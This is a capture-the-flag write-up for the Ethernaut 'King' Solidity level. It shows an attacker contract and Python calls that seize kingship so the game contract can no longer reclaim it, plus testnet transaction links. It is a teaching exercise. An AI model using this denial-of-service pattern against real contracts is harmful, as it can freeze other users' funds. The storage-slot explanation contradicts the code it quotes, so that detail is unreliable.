# King

## Objectives

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

## Solution

Here all we have to do is have a contract become `king` as opposed to an ordinary address. So we create a contract that performs a low level call to send the funds (because `transfer` would run out of gas) to the King contract. The amount to send has to be greater than or equal to 0.001 ETH (1e15 wei). Once the contract takes over as king, no other contract or address can take over.

## How I did it

1. Deploy the attacking contract KingAttack (at: `0x27eb59A15364a45a53AcB341514e0fcAf44BF0Ad`)

```python
kingattack = KingAttack.deploy(EthernautInstances['king'], _from)
```

2. Call the `becomeKing()` function, while sending enough funds to take over the contract (1e15 wei = 0.001 ether) defined in the contract as follows:

```cs
function becomeKing() external payable {
    (bool success,) = address(kingContract).call{value: msg.value}("");
    require(success, "Transfer failed.");
}
```

Calling it in python, we get the value directly from the King contract's storage position 2, where the prize is located (located in position 2 because it is a uin256 which occupies a full slot and the first slot is occupied by an address, also 32 bytes).

```python
kingattack.becomeKing({'value':int(web3.eth.getStorageAt(king.address, '0x01').hex(),16)} | _from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0xcb97566e0e4fbd7658eb587ba7d7418d54ce86830542dd567c23f73cb1b46873

3. Check that we have actually become King

```python
king_assertion = king._king() == kingattack.address
print(f'The contract address {kingattack.address} is the king: {king_assertion}')
```

With the prior knowledge that the contract cannot be taken over by a normal address or another contract, we have effectively broken the takeover mechanism.

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x9124cf8bb5f0bc17806a8264443ac0b5a3b9ea22a49818af9d1205be9dbb6aec
